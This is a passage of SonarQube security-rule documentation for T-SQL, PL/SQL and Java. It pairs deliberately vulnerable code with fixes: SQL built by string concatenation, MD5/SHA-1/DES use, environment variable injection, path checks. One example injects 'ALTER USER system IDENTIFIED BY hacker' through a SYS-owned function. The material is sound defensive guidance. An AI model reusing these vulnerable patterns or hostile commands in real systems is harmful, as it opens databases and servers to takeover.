  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S1523">
              tsql:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807">CVE-2017-9807</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802">CVE-2017-9802</a> </li>
</ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a
href="https://owasp.org/www-community/attacks/Code_Injection">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>Both <code>EXECUTE( ... )</code> and <code>EXEC( ... )</code> execute as a command the string passed as an argument. They are safe only if the
argument is composed of constant character string expressions. But if the command string is dynamically built using external parameters, then it is
considered very dangerous because executing a random string allows the execution of arbitrary code.</p>
<p>This rule marks for review each occurrence of <code>EXEC</code> and <code>EXECUTE</code>. This rule does not detect code injections. It only
highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>
  <li> you really need to run code dynamically. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The best solution is to not run code provided by an untrusted source. If you really need to build a command string using external parameters, you
should use <code>EXEC sp_executesql</code> instead.</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<h2>Sensitive Code Example</h2>
<pre>
CREATE PROCEDURE USER_BY_EMAIL(@email VARCHAR(255)) AS
BEGIN
  EXEC('USE AuthDB; SELECT id FROM user WHERE email = ''' + @email + ''' ;'); -- Sensitive: could inject code using @email
END
</pre>
<h2>Compliant Solution</h2>
<pre>
CREATE PROCEDURE USER_BY_EMAIL(@email VARCHAR(255)) AS
BEGIN
  EXEC sp_executesql 'USE AuthDB; SELECT id FROM user WHERE email = @user_email;',
                     '@user_email VARCHAR(255)',
                      @user_email = @email;
END
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S4790">
              tsql:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT HASHBYTES('SHA1', MyColumn) FROM dbo.MyTable;
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT HASHBYTES('SHA2_512', MyColumn) FROM dbo.MyTable;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S2070">
              plsql:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=plsql%3AS4790&rule_key=plsql%3AS4790'>S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
DBMS_CRYPTO.Hash(str, HASH_MD4);

DBMS_CRYPTO.Hash(str, HASH_MD5);

DBMS_CRYPTO.Hash(str, HASH_SH1);
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/328">CWE-328 - Reversible One-Way Hash</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:SysOwnedFunctions">
              plsql:SysOwnedFunctions
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Some Oracle packages contain powerful SYS-owned functions that can be used to perform malicious operations. For instance,
<code>DBMS_SYS_SQL.PARSE_AS_USER</code> can be used to execute a statement as another user.</p>
<p>Most programs do not need those functions and this rule helps identify them in order to prevent security risks.</p>
<h3>Noncompliant code example</h3>
<pre>
DECLARE
  c INTEGER;
  sqltext VARCHAR2(100) := 'ALTER USER system IDENTIFIED BY hacker'; -- Might be injected by the user
BEGIN
  c := SYS.DBMS_SYS_SQL.OPEN_CURSOR();                               -- Noncompliant

   -- Will change 'system' user's password to 'hacker'
  SYS.DBMS_SYS_SQL.PARSE_AS_USER(c, sqltext, DBMS_SQL.NATIVE, UID);  -- Non-Compliant

  SYS.DBMS_SYS_SQL.CLOSE_CURSOR(c);                                  -- Noncompliant
END;
/
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/269">CWE-269 - Improper Privilege Management</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/270">CWE-270 - Privilege Context Switching Error</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S1523">
              plsql:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807">CVE-2017-9807</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802">CVE-2017-9802</a> </li>
</ul>
<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so
with code coming from an untrusted source. <a href="https://owasp.org/www-community/attacks/Code_Injection">Injected Code</a> can either run on the
server or in the client (exemple: XSS attack).</p>
<p><code>EXECUTE IMMEDIATE</code> executes as a dynamic SQL statement or anonymous PL/SQL block the string passed as an argument. It’s safe only if
the argument is composed of constant character string expressions. But if the command string is dynamically built using external parameters, then it
is considered very dangerous because executing a random string allows the execution of arbitrary code.</p>
<p>This rule marks for review each occurence of dynamic code execution.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>
  <li> you really need to run code dynamically. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The best solution is to not run code provided by an untrusted source. If you really need to build a command string using external parameters, you
should use <code>EXECUTE IMMEDIATE</code> with bind variables instead.</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<h2>Sensitive Code Example</h2>
<pre>
CREATE OR REPLACE PROCEDURE ckpwd (p_user IN VARCHAR2, p_pass IN VARCHAR2)
IS
 v_query  VARCHAR2(100);
 v_output NUMBER;
BEGIN
 v_query :=    q'{SELECT COUNT(*) FROM user_pwd }'
         ||    q'{WHERE username = '}'
         ||    p_user
         ||    q'{' AND password = '}'
         ||    p_pass
         ||    q'{'}';
 EXECUTE IMMEDIATE v_query
  INTO v_output;
END;
</pre>
<h2>Compliant Solution</h2>
<pre>
CREATE OR REPLACE PROCEDURE ckpwd_bind (p_user IN VARCHAR2, p_pass IN VARCHAR2)
IS
 v_query  VARCHAR2(100);
 v_output NUMBER;
BEGIN
 v_query :=
   q'{SELECT COUNT(*) FROM user_pwd WHERE username = :1 AND password = :2}';
 EXECUTE IMMEDIATE v_query
  INTO v_output
  USING p_user, p_pass;
END;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S2278">
              plsql:S2278
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=plsql%3AS5547&rule_key=plsql%3AS5547'>S5547</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
PLS_INTEGER := DBMS_CRYPTO.ENCRYPT_DES
                           + DBMS_CRYPTO.CHAIN_CBC
                           + DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h3>Compliant solution</h3>
<pre>
PLS_INTEGER := DBMS_CRYPTO.ENCRYPT_AES256
                           + DBMS_CRYPTO.CHAIN_CBC
                           + DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S5547">
              plsql:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in <code>DBMS_CRYPTO</code></h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
PLS_INTEGER := DBMS_CRYPTO.ENCRYPT_DES              // Noncompliant
                           + DBMS_CRYPTO.CHAIN_CBC
                           + DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
PLS_INTEGER := DBMS_CRYPTO.ENCRYPT_AES256
                           + DBMS_CRYPTO.CHAIN_CBC
                           + DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Oracles docs - <a href="https://docs.oracle.com/en/database/oracle/oracle-database/21/arpls/DBMS_CRYPTO.html">DBMS_CRYPTO reference</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S4790">
              plsql:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6547">
              javasecurity:S6547
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Environment variable injection occurs in an application when the application receives data from a user or a third-party service and, without
sanitizing it first, does the following:</p>
<ul>
  <li> Creates an environment variable based on the external data. </li>
  <li> Inserts the external data into certain sensitive environment variables, such as <code>PATH</code> or <code>LD_PRELOAD</code>.   <pre>
If an application uses environment variables that are vulnerable to injection, it is exposed
to a variety of attacks that aim to exploit supposedly safe environment variables, such as `PATH`.
</pre>   </li>
</ul>
<p>A user with malicious intent carefully performs actions aimed at modifying or adding environment variables to profit from it.</p>
<h3>What is the potential impact?</h3>
<p>When user-supplied values are used to manipulate environment variables, an attacker can supply carefully chosen values that cause the system to
behave unexpectedly.<br> In some cases, the attacker can use this capability to execute arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attacker manages to inject an environment variable that is recognized and used by the remote system. For example, this could
be the secret of a particular cloud provider used in an environment variable, or <code>PATH</code>.</p>
<p>Depending on the application, the attacker can read or modify important data or perform unwanted actions.<br> For example, injecting data into the
<code>HTTP_PROXY</code> variable could lead to data leakage.</p>
<h4>Application compromise</h4>
<p>In the worst case, an attacker manages to inject an important environment variable such as <code>LD_PRELOAD</code> and execute code by overriding
trusted code.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, and for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to environment variable manipulation as it constructs the variables from untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
  Runtime r = Runtime.getRuntime();
  String userInput = request.getParameter("example");

  if (userInput != null) {
    String[] envs = {userInput};
    r.exec("/path/to/example", userInput);
  } else{
    r.exec("/path/to/example");
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
  Runtime r = Runtime.getRuntime();
  String userInput = request.getParameter("example");

  if (userInput != null &amp;&amp; userInput.matches("^[a-zA-Z0-9]*$")) {
    String[] envs = {"ENV_VAR=%s".format(userInput)};
    r.exec("/path/to/example", envs);
  } else {
    r.exec("/path/to/example");
  }
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure environment variables that you want the application to be able to use.<br> If a user input does not match an
entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/454">CWE-454 - External Initialization of Trusted Variables or Data Stores</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6549">
              javasecurity:S6549
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Applications behave as filesystem oracles when they disclose to attackers if resources from the filesystem exist or not.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initially intended path. The resulting
path would resolve to a location somewhere in the filesystem which the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a filesystem oracle vulnerability can determine if a file exists or not.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
elevated privileges, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Information gathering</h4>
<p>The vulnerability is exploited to gather information about the host system. The filesystem oracle can help identify user accounts, running
services, or the exact version of installed software.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a file system oracle as it allows testing the existence of a file anywhere on the file system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.io.File;

@Controller
public class ExampleController
{
    static private String targetDirectory = "/path/to/target/directory/";

    @GetMapping(value = "/exists")
    public void delete(@RequestParam("filename") String filename) throws IOException {

        File file = new File(targetDirectory + filename);
        if (!file.exists()) { // Noncompliant
            throw new IOException("File does not exists in the target directory");
        }
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.io.File;

@Controller
public class ExampleController
{
    static private String targetDirectory = "/path/to/target/directory/";

    @GetMapping(value = "/exists")
    public void delete(@RequestParam("filename") String filename) throws IOException {

        File file = new File(targetDirectory + filename);
        String canonicalDestinationPath = file.getCanonicalPath();

        if (!canonicalDestinationPath.startsWith(targetDirectory)) {
            throw new IOException("Entry is outside of the target directory");
        } else if (!file.exists()) {
            throw new IOException("File does not exists in the target directory");
        }
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>The universal way to avoid filesystem oracle vulnerabilities is to validate paths constructed from untrusted data:</p>
<ol>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal (see the "Pitfalls" section). </li>
  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative paths or
  path components like <code>../</code> and remove any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
</ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol>
  <li> <code>data = transform(user_input);</code> </li>
  <li> <code>data = normalize(data);</code> </li>
  <li> <code>data = sanitize(data);</code> </li>
  <li> <code>use(data);</code> </li>
</ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v=V-DdcKADnFk">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String targetDirectory = "/Users/John";

@GetMapping(value = "/endpoint")
public void endpoint(@RequestParam("folder") fileName) throws IOException {

    String canonicalizedFileName = fileName.getCanonicalPath();

    if (!canonicalizedFileName.startsWith(targetDirectory)) {
        throw new IOException("Entry is outside of the target directory");
    }
}
</pre>
<p>This check can be bypassed if other directories start with <code>John</code>. For instance, <code>"/Users/Johnny".startsWith("/Users/John")</code>
returns <code>true</code>. Thus, for validation, <code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions, such as <code>getCanonicalPath</code>, remove the terminating path separator in their return value.<br>
The validation code should be tested to ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3">Here is a real-life example of this vulnerability.</a></p>
<h4>Do not use java.nio.file.Path.resolve as a validator</h4>
<p>As specified in the <a href="https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html">official documentation</a>, if the given parameter
is an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>
<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5135">
              javasecurity:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
